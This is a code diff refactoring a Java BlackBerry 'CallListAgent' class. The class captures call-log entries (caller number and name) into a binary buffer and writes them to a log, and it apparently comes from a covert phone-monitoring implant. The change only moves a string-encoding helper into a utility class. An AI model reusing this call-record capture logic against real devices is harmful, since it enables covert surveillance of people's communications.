@@ -11,15 +11,13 @@ package blackberry.agent;
 import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.AppListener;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.CallListObserver;
-import blackberry.interfaces.PhoneCallObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
-import blackberry.utils.WChar;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -88,16 +86,16 @@ public final class CallListAgent extends Agent implements CallListObserver {
 
         String nametype = "u";
         String note = "no notes";
-        
+
         //#ifdef DBC
         Check.requires(number != null, "callLogAdded null number");
         Check.requires(name != null, "callLogAdded null name");
         Check.requires(nametype != null, "callLogAdded null nametype");
-        Check.requires(note != null, "callLogAdded null note");        
+        Check.requires(note != null, "callLogAdded null note");
         //#endif
 
         final int LOG_CALLIST_VERSION = 0;
-       
+
         int len = 28; //0x1C;
 
         len += wsize(number);
@@ -125,27 +123,16 @@ public final class CallListAgent extends Agent implements CallListObserver {
                 "callLogAdded: wrong len: " + databuffer.getLength());
         //#endif
 
-        addString(databuffer,(byte) 0x01,name);
-        addString(databuffer,(byte) 0x02,nametype);
-        addString(databuffer,(byte) 0x04,note);
-        addString(databuffer,(byte) 0x08,number);
+        Utils.addTypedString(databuffer, (byte) 0x01, name);
+        Utils.addTypedString(databuffer, (byte) 0x02, nametype);
+        Utils.addTypedString(databuffer, (byte) 0x04, note);
+        Utils.addTypedString(databuffer, (byte) 0x08, number);
 
         log.createLog(getAdditionalData());
 
         byte[] array = databuffer.getArray();
         log.writeLog(array, 0);
         log.close();
-    }
-
-    private void addString(DataBuffer databuffer, byte type, String name) {
-        if (name.length() > 0) {
-            int header = (type << 24) | (name.length() * 2);
-            databuffer.writeInt(header);
-            databuffer.write(WChar.getBytes(name, false));
-            //#ifdef DEBUG_TRACE
-            debug.trace("callLogAdded: name len: " + (header & 0x00ffffff));
-            //#endif
-        }
     }
 
     private int wsize(String string) {
